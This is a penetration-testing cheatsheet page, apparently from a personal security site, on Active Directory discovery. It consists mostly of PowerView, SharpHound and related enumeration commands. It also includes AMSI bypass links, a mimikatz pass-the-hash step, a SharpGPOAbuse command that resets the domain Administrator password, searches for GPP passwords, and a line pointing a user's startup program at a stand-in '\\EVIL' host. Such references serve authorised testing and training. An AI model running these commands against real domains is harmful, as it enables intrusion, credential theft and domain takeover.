---
layout: post
title: discovery / ad 
category: 01-discovery
parent: cheatsheets
modified_date: 2024-12-04
permalink: /discov/ad
---

**Useful links** 
- [learn AD security](/sysadmin/win-ad-sec-awesome/#starting-your-journey)
- [TA0007 - Discovery](https://attack.mitre.org/tactics/TA0007/)
- [Interesting AD cheatsheets](/sysadmin/win-ad-sec-awesome/#OffensivePowershell)

**Menu**
<!-- vscode-markdown-toc -->
* [prereq](#prereq)
	* [install](#install)
	* [load-env](#load-env)
	* [spawn-cmd](#spawn-cmd)
	* [run-powershell](#run-powershell)
		* [bypass-amsi](#bypass-amsi)
		* [load-powersploit](#load-powersploit)
		* [no-errors](#no-errors)
	* [run-bloodhound](#run-bloodhound)
* [collect](#collect)
* [shoot](#shoot)
	* [shoot-forest](#shoot-forest)
	* [shoot-dns](#shoot-dns)
	* [shoot-dom](#shoot-dom)
		* [shoot-dcs](#shoot-dcs)
		* [shoot-adcs](#shoot-adcs)
		* [shoot-desc-users](#shoot-desc-users)
		* [shoot-laps](#shoot-laps)
		* [shoot-pwd-notreqd](#shoot-pwd-notreqd)
		* [shoot-pwd-policy](#shoot-pwd-policy)
		* [shoot-delegations](#shoot-delegations)
		* [shoot-priv-users](#shoot-priv-users)
		* [shoot-priv-machines](#shoot-priv-machines)
		* [shoot-gpo](#shoot-gpo)
		* [shoot-gpp](#shoot-gpp)
		* [shoot-shares](#shoot-shares)
		* [shoot-mssql-servers](#shoot-mssql-servers)
		* [shoot-spns](#shoot-spns)
		* [shoot-npusers](#shoot-npusers)
		* [shoot-dacl](#shoot-dacl)
		* [shoot-gmsa](#shoot-gmsa)
* [iter](#iter)
	* [iter-sid](#iter-sid)
	* [iter-memberof](#iter-memberof)
	* [iter-scope](#iter-scope)
	* [iter-dacl](#iter-dacl)
	* [iter-gpos](#iter-gpos)
* [refresh](#refresh)
	* [check-computer-access](#check-computer-access)
	* [last-logons](#last-logons)
	* [last-logons-computer](#last-logons-computer)
	* [last-logons-ou](#last-logons-ou)
	* [whereis-user](#whereis-user)
	* [whereis-group](#whereis-group)
* [misc](#misc)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

**Tools**

<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
<script>$(window).load(function() {var repos = [""]; for (rep in repos) {$.ajax({type: "GET", url: repos[rep], dataType: "json", success: function(result) {$("#repo_list").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.pushed_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>

<link href="/sortable.css" rel="stylesheet" />
<script src="/sortable.js"></script>
<div id="repos">
    <table id="repo_list" class="sortable">
      <tr><th>_repo</th><th>_last_push</th><th>_stars</th><th>_watch</th><th>_language</th></tr>
    </table>
</div>

![Enumeration Strategy](/assets/images/ad_enum_strat.png)

## <a name='prereq'></a>prereq

PRE-REQUISITES: 

### <a name='install'></a>install

* SharpHound :
- [latest scripts & binary](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)
- [python alternative](https://github.com/fox-it/BloodHound.py)

* BloodHound :
- [neo4j & bloodhound-gui](https://bloodhound.readthedocs.io/en/latest/installation/windows.html)


Running powershell :

- [PowerView CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)

### <a name='load-env'></a>load-env

* URL suffix (F6 shortcut) : [/pen/setenv#win](/pen/setenv#win)

### <a name='spawn-cmd'></a>spawn-cmd

Spawn an AD account with CMD.exe:

![funny reminder](/assets/images/pen-win-sys-spawn-cmd.jpg)

:link: Check the **readthedocs of sharphound** to [spawn an AD account](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html#running-sharphound-from-a-non-domain-joined-system).

```powershell
# using a cleartext password
runas /netonly /user:adm_x@dom.corp powershell -ep bypass
# switch to FullLanguage
$ExecutionContext.SessionState.LanguageMode
$ExecutionContext.SessionState.LanguageMode FullLanguage
```

### <a name='run-powershell'></a>run-powershell

#### <a name='bypass-amsi'></a>bypass-amsi
- [amsi.fails](https://amsi.fails)
- [S3cur3Th1sSh1t](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
- [notes.offsec-journey.com](https://notes.offsec-journey.com/evasion/amsi-bypass)

#### <a name='load-powersploit'></a>load-powersploit

```powershell
# open cmd.exe as admin
powershell -ep bypass
C:\Tools>C:\Tools\Invishell\RunWithRegistryNonAdmin.bat
.\PowerView.ps1

# run powershell with pass-the-hash
mimikatz.exe
privilege::debug
sekurlsa::pth /user:$zlat_user /rc4:xxx  /domain:$zdom /dc:$zdom_dc_fqdn /run:"powershell -ep bypass"
.\PowerView.ps1

# Mandiant Commando VM
cd C:\tools\PowerSploit\Recon
Import-Module ./Recon.psm1
gcm -m Recon
```



#### <a name='no-errors'></a>no-errors

Handling console errors
```powershell
$ErrorActionPreference = 'SilentlyContinue' # hide errors on out console
$ErrorActionPreference = 'Continue' # set back the display of the errors
```

### <a name='run-bloodhound'></a>run-bloodhound 
```powershell
# Path for VM Mandiant Commando
# Start the Neo4J database
C:\Tools\neo4j-community\neo4j-community-3.5.1\bin>./neo4j.bat console
```

## <a name='collect'></a>collect

Data Collection with SharpHound:

![SharpHound Cheatsheet](/assets/images/pen-win-ad-enum-sharphound-cheatsheet.png)

Image credit: [https://twitter.com/SadProcessor](https://twitter.com/SadProcessor)

Refresh sessions:
```powershell
# STEP 1 : go to bloodhound GUI / database statistics / clear session data
# STEP 2 : collect sessions again # e.g. every 15 minutes for 2 hours
 ./sharphound.exe -c session --Loop --LoopDuration 2:00:00 --LoopInterval 00:15:00 --domain $zdom_fqdn --domaincontroller $zdom_dc_fqdn
```
:link: Check the **readthedocs of sharphound** to [refresh the sessions](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html#the-session-loop-collection-method).


## <a name='shoot'></a>shoot

SHOOT General Properties:

### <a name='shoot-forest'></a>shoot-forest

Forest properties:

```powershell
# get the trusts of the current domain/forest
nltest /domain_trusts
Get-NetDomainTrust -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ft -autosize TargetName, TrustDirection 
# TO DEBUG
Get-NetForestTrust -Forest $zforest

# find users with sidHistory set
Get-DomainUser -LDAPFilter '(sidHistory=*)' -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn
```

### <a name='shoot-dns'></a>shoot-dns
```powershell
```

### <a name='shoot-dom'></a>shoot-dom
```powershell
# get the domain properties: fsmo, DCs, ntds replication, dns servers, machineaccountquota
Get-DomainObject -identity $zdom_dn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn
```

#### <a name='shoot-dcs'></a>shoot-dcs
```powershell
nltest /dclist:$zdom_fqdn
Get-NetDomainController -Domain $zdom_fqdn -Server $zdom_dc_fqdn
```

#### <a name='shoot-adcs'></a>shoot-adcs
```powershell
certify.exe find /vulnerable /domain:$zdom_fqdn /path:$zpki_dn
```

#### <a name='shoot-desc-users'></a>shoot-desc-users
```powershell
```

#### <a name='shoot-laps'></a>shoot-laps
* [DirSync](https://github.com/simondotsh/DirSync)
https://github.com/swisskyrepo/SharpLAPS
https://github.com/p0dalirius/pyLAPS
```powershell
```

#### <a name='shoot-pwd-notreqd'></a>shoot-pwd-notreqd
```powershell
# ActiveDirectory module 
Get-ADUser -Filter {PasswordNotRequired -eq $true -and Enabled -eq $true} | Select SamAccountName 
```
#### <a name='shoot-pwd-policy'></a>shoot-pwd-policy
```powershell
net accounts

# enumerate the current domain controller policy
$DCPolicy = Get-DomainPolicy -Policy $zdom_dc_fqdn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
$DCPolicy.PrivilegeRights # user privilege rights on the dc...

# enumerate the current domain policy
$zdom_fqdn_pos = Get-DomainPolicy -Policy $zdom_fqdn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
$zdom_fqdn_pos.KerberosPolicy
$zdom_fqdn_pos.SystemAccess # password age/etc.
```

#### <a name='shoot-delegations'></a>shoot-delegations
```powershell
# with password in the CLI
$zz = $zdom_fqdn + '/' + $ztarg_user_name + ':' + $ztarg_user_pass
.\findDelegation.py  $zz
# with kerberos auth / password not in the CLI
$zz = $zdom_fqdn + '/' + $ztarg_user_user
.\findDelegation.py  $zz -k -no-pass
```

References :
- [thehacker.recipes/ad/movement/kerberos/delegations - KUD / KCD / RBCD](https://www.thehacker.recipes/ad/movement/kerberos/delegations)
- [https://attack.mitre.org/techniques/T1134/001/](https://attack.mitre.org/techniques/T1134/001/)

#### <a name='shoot-priv-users'></a>shoot-priv-users
```powershell
# get the domain's distinguisedname attribute
get-netuser -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select -first 1 
$zdom_dn = "DC=" + $zdom + ",DC=" + $zforest # only valid if 2 levels

# DCSync
# TO DEBUG : get-forest error ...
get-domainobjectacl $zdom_dn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -ResolveGUIDs | ? {
	($_.ObjectType -match 'replication-get') -or
	($_.ActiveDirectoryRights -match 'GenericAll')
} 

# AdminSDHolder
$search_base = "CN=AdminSDHolder,CN=System," + $zdom_dn
Get-DomainObjectAcl -SearchBase $search_base -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 

# Privileged Groups
$ztarg_group_name="Domain Admins"
#$ztarg_group_name="Enterprise Admins"
#$ztarg_group_name="Backup Operators"
#$ztarg_group_name="Remote Desktop Users"
#$ztarg_group_name="DNSAdmins"
Get-NetGroupMember $ztarg_group_name -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Recurse | select membername

# Protected Users 
Get-NetGroupMember "Protected Users" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select membername
Get-NetGroupMember "Protected Users" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Recurse | select membername
```

- [Well-known Microsoft SID List](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab?redirectedfrom=MSDN)
- [T1003.006](https://attack.mitre.org/techniques/T1003/006) DCSYNC

#### <a name='shoot-priv-machines'></a>shoot-priv-machines
```powershell
# find any machine accounts in privileged groups
Get-DomainGroup -AdminCount -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | Get-NetGroupMember -Recurse -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ?{$_.MemberName -like '*$'}
```

#### <a name='shoot-gpo'></a>shoot-gpo
```sh
# list sysvol
ls \\$zdom_fqdn\SYSVOL\$zdom_fqdn\Policies\

# SharpGPOAbuse
SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" --Author $zdom_fqdn\$ztarg_user_name --Command "cmd.exe" --Arguments "/c net user Administrator Password!@# /domain" --GPOName "ADDITIONAL DC CONFIGURATION"

# find cpassword
findstr /S /I cpassword \\$zdom_fqdn\sysvol\$zdom_fqdn\policies\*.xml
Get-GPPPassword.ps1
```
#### <a name='shoot-gpp'></a>shoot-gpp
```sh
```

#### <a name='shoot-shares'></a>shoot-shares

T1135 Network Shares

References:
- [https://attack.mitre.org/techniques/T1135](https://attack.mitre.org/techniques/T1135/)

```powershell
# find share folders in the domain
Invoke-ShareFinder -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn

# use alternate credentials for searching for files on the domain
#   Find-InterestingDomainShareFile == old Invoke-FileFinder
Find-InterestingDomainShareFile -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Credential $zlat_creds
```

#### <a name='shoot-mssql-servers'></a>shoot-mssql-servers
Txxx MSSQL servers

References:
- [BloodHound Edge SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)
- [PowerUpSQL CheatSheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

```powershell
# Invoke-UserHunter -UserIdentity dba_admin > mssql_instances_shorted.txt
# sed 's/MSSQLSvc\/\([a-z,A-Z,0-9]*\)\(\.contoso\.corp:\|:\)\?\(.*\)/\1/g' mssql_instances_shorted.txt | sort -u > mssql_servers_shorted.txt
# get-content mssql_servers_shorted.txt | get-netcomputer -Identity $_ -properties cn,description,OperatingSystem,OperatingSystemVersion,isCriticalSystemObject

 Get-SQLInstanceDomain -Verbose -DomainController $zdom_dc_fqdn -Username CONTOSO\mssql_admin -password Password01 > mssql_instances.txt
```

#### <a name='shoot-spns'></a>shoot-spns

T1046 SERVICES LOOTS

References:
- [https://attack.mitre.org/techniques/T1046](https://attack.mitre.org/techniques/T1046/)

```powershell
# find all users with an SPN set (likely service accounts)
Get-NetUser -SPN -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select name, description, lastlogon, badpwdcount, logoncount, useraccountcontrol, memberof

# wsman
# mssqlsvc
sed 's/MSSQLSvc\/\([a-z,A-Z,0-9]*\)\(\.contoso\.corp:\|:\)\?\(.*\)/\1/g' mssql_instances_shorted.txt | sort -u > mssql_servers_shorted.txt

# find all service accounts in "Domain Admins"
Get-DomainUser -SPN -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ?{$_.memberof -match 'Domain Admins'}

# find all Win2008 R2 computers (likely servers) and IP/ICMP reachable
Get-NetComputer -OperatingSystem "Windows 2008*" -Ping -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
```

#### <a name='shoot-npusers'></a>shoot-npusers

```powershell
```

#### <a name='shoot-dacl'></a>shoot-dacl
```powershell

# STEP 1: global gathering
Invoke-ACLScanner -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
sharphound.exe --CollectionMethod ACL --domain $zdom_fqdn --domaincontroller $zdom_dc_fqdn

# STEP 2: check for "authenticated users", "everyone" group, target account
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match $ztarg_user_name}
$ztarg_group_name="Authenticated Users"
# $ztarg_group_name="Everyone"
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match $ztarg_group_name}

# STEP 3: gather info on security groups
#$ztarg_group="Domain Computers"
$ztarg_group="RDP Users"
Get-ObjectAcl -SamAccountName $ztarg_group -ResolveGUIDs -Verbose -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
Invoke-ACLScanner -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ?{$_.IdentityReference -match $ztarg_group}

# STEP 4: enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn  | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
```

sources:
- [attack 0 to 0.9: Authorization](https://zer1t0.gitlab.io/posts/attacking_ad/#authorization)
- BloodHound Edges: [GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall) / [WriteDacl](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl) / [GenericWrite](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite)

#### <a name='shoot-gmsa'></a>shoot-gmsa
* [gMSADumper](https://github.com/micahvandeusen/gMSADumper)

## <a name='iter'></a>iter

ITER(ated) Enumeration:

To ITERate when owning new privileges (aka new account with new user groups): 
- powershell: spawn a shell, [generate PS Credential object](/sysadmin/sys-win-ps-useful-queries/#PSCredentialinitialization), Rubeus PTT
- impacket : PTH, PTT, clear password

### <a name='iter-sid'></a>iter-sid
```powershell
whoami /priv
wmic useraccount where name=$ztarg_user_name get sid
```

### <a name='iter-memberof'></a>iter-memberof
```powershell
# identify if the new account is 'memberof' new groups
get-netgroup -MemberIdentity $ztarg_user_name -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select cn | ft -autosize >> .\grp_xxx.txt

# identify if the new account is 'memberof' new groups 
get-netuser -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select cn, whenCreated, accountExpires, pwdLastSet, lastLogon, logonCount, badPasswordTime, badPwdCount | ft -autosize | Sort-Object -Descending -Property whenCreated >> .\auth_xxx.txt
get-content pwned_accounts.txt | get-netuser -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select cn, whenCreated, accountExpires, pwdLastSet, lastLogon, logonCount, badPasswordTime, badPwdCount | ft -autosize | Sort-Object -Descending -Property whenCreated >> .\auth_xxx.txt
```

### <a name='iter-scope'></a>iter-scope
```powershell
# STEP 1: if new groups, find where the account is local admin
Find-LocalAdminAccess -ComputerDomain $zdom_fqdn -Server $zdom_dc_fqdn >> .\owned_machines.csv

# STEP 2.1: get the DNs of the owned machines 
get-content .\owned_machines.csv | %{get-netcomputer $_ -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn} | select-object -Property distinguishedname | ft -autosize >> .\owned_machines_w_ou.csv

# STEP 2.2: get the OS of the owned machines 
get-content .\owned_machines.csv | %{get-netcomputer $_ -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn} | select-object -Property cn,operatingSystem | ft -autosize >> .\owned_machines_w_ou.csv
```

### <a name='iter-dacl'></a>iter-dacl
```powershell
$(Get-ADUser anakin -Properties nTSecurityDescriptor).nTSecurityDescriptor.Access[0]

# enumerate who has rights to the $user in $zdom_fqdn, resolving rights GUIDs to names
Get-DomainObjectAcl -Identity $user -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
```

### <a name='iter-gpos'></a>iter-gpos
```powershell
# get the default domain policy
Get-DomainGPO
displayname = "Default Domain Policy"

# get the gpos for a group
Get-DomainGPO
displayname = $ztarg_group

# get the gpos for an OU
Get-DomainGPO -Identity (Get-DomainOU -Identity $ztarg_ou).gplink.substring(11,(Get-DomainOU -Identity $ztarg_ou).gplink.length-72)
```

## <a name='refresh'></a>refresh

REFRESH(ed) Enumeration:

### <a name='check-computer-access'></a>check-computer-access
```powershell
# listing the kerberos tickets
klist

# check smb admin share access 
dir \\$ztarg_computer_fqdn\c$

# check local admin
Find-LocalAdminAccess -ComputerDomain $zdom_fqdn -Server $zdom_dc_fqdn -ComputerName $ztarg_computer_fqdn

# ExecuteDCOM: check if rpc service is active / granted
get-wmiobject -Class win32_operatingsystem -Computername $ztarg_computer_fqdn
```

**ExecuteDCOM ressources**: [[CS by enigma0x3]](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) / [[Bloodhound readthedocs]](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#executedcom)

**CanPSRemote ressources**: [[JMVWORK sysadmin]](/sysadmin/sys-win-ps-useful-queries/#PSSessionInvoke-Command) / [[Bloodhound readthedocs]](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#executedcom).

### <a name='last-logons'></a>last-logons

Last Logons for DA, EA, ...

```powershell
$ztarg_grp="Domain Admins"
#$ztarg_grp="Enterprise Admins"
#$ztarg_grp="Backup Operators"
#$ztarg_grp="Remote Desktop Users"
#$ztarg_grp="DNSAdmins"

# get the priviledge users (from above the DA) sorted by last logon
Get-NetGroupMember $ztarg_grp -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Recurse | %{Get-NetUser $_.membername -domain $zdom_fqdn -domaincontroller $zdom_dc_fqdn | select samAccountName,LogonCount,LastLogon,mail} | Sort-Object -Descending -Property lastlogon

# find admin groups based on "adm" keyword
Get-NetGroup -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn *adm* 
```

### <a name='last-logons-computer'></a>last-logons-computer
Who is logged on a computer:
```powershell
# get actively logged users on a computer
Get-NetLoggedon -ComputerName $ztarg_computer_fqdn
Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access

# get last logged users on a computer / uses remote registry / can be blocked
Get-LastLoggedon -ComputerName $ztarg_computer -Credential $zlat_creds

# testing account "john_doe" with empty passwords 
$zlat_creds = New-Object System.Management.Automation.PSCredential($ztarg_user, (new-object System.Security.SecureString))
Invoke-Command -Credential $zlat_creds -ComputerName $ztarg_computer -ScriptBlock {whoami; hostname}
```

### <a name='last-logons-ou'></a>last-logons-ou
Last logons on an OU :
```powershell
# Get the logged on users for all machines in any *server* OU in a particular domain
Get-DomainOU -Identity $ztarg_computer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | %{Get-DomainComputer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_ -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn}}
```

### <a name='whereis-user'></a>whereis-user
Where targeted user is connected
```powershell
Invoke-UserHunter $ztarg_user_name -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
Invoke-UserHunter $ztarg_user_name -CheckAccess -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
Invoke-UserHunter $ztarg_user_name -CheckAccess -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select username, computername, IPAddress
```

### <a name='whereis-group'></a>whereis-group
Where targeted users' group are connected
```powershell
Invoke-UserHunter -Group $ztarg_group_name -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select computername, membername
```


## <a name='misc'></a>misc

```powershell
# look for a user from his objectsid
$objectsid = 'S-1-5-21-123'
get-netuser -domain $zdom_fqdn -domaincontroller $zdom_dc_fqdn | ?{$_.objectsid -eq $objectsid} | select -first 1

# look for the keyword "pass" in the description attribute for each user in the domain
Find-UserField -SearchField Description -SearchTerm "pass" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn

# return the local group *members* of a remote server using Win32 API methods (faster but less info)
Get-NetLocalGroupMember -Method API -ComputerName <Server>.<FQDN> -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn

# local admin rights
Find-GPOComputerAdmin -ComputerName $computer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
Get-NetOU $OU -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | %{Get-NetComputer -ADSPath $_ -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn}

# reset password
Get-NetGPO -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | %{Get-ObjectAcl -ResolveGUISs -Name $_.Name -RightsFilter "ResetPassword" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn }

# RDP access
Get-DomainGPOUserLocalGroupMapping -LocalGroup RDP -Identity $user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
Get-DomainGPOUserLocalGroupMapping -LocalGroup RDP -Identity $group -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 

# list users and GPO he can modifiy
Get-NetGPO -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | %{Get-ObjectAcl -ResolveGUISs -Name $_.Name -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn }

# retrieve all the computer dns host names a GPP password applies to
Get-DomainOU -GPLink '<GPP_GUID>' -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn}

# enumerate what machines that a particular user/group identity has local admin rights to
#   Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation
Get-DomainGPOUserLocalGroupMapping -Identity $ztarg_user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
Get-DomainGPOUserLocalGroupMapping -Identity $ztarg_group -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 

# export a csv of all GPO mappings
Get-DomainGPOUserLocalGroupMapping -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv

# find all policies applied to a computer/server
Get-DomainGPO -ComputerIdentity $computer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn

# find all policies applied to an user
Find-GPOLocation -UserName $ztarg_user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn

# all disabled users
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
Get-DomainUser -UACFilter ACCOUNTDISABLE -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 

# find all computers in a given OU
Get-DomainComputer -SearchBase "ldap://OU=..." -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 

# enumerate all gobal catalogs in the forest
Get-ForestGlobalCatalog -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 

# turn a list of computer short names to FQDNs, using a global catalog
gc computers.txt | % {Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_)" -Properties dnshostname -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn }

# save a PowerView object to disk for later usage
Get-DomainUser -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | Export-Clixml user.xml
$ztarg_users = Import-Clixml user.xml

# enumerate all groups in a domain that don't have a global scope, returning just group names
Get-DomainGroup -GroupScope NotGlobal -Properties name -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 

# set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 

# set the owner of $ztarg_obj in the current domain to $zlat_user
Set-DomainObjectOwner -Identity $ztarg_obj -OwnerIdentity $ztarg_user_name -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
```